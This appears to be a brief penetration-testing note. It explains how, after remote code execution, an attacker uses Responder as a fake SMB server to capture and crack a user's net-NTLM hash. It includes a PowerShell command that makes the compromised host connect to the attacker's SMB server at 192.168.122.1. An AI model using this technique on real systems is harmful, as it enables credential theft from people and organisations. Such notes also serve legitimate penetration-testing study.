If we managed to get RCE in host but we don't know the credentials of the user. Then we can start up a fake SMB server,
Then in the compromised host we try to access the shares in the fake SMB server. This well force the host to introduce 
the net-NTLM hash to SMB server. We can use this for cracking the hash to get the password.

We can use `responder` as SMB server, then in the host try to access the fake SMB server like:

```powershell
dir \\192.168.122.1\fakeDirectory 
```
After hitting enter we will get the NTLM hash of the user.
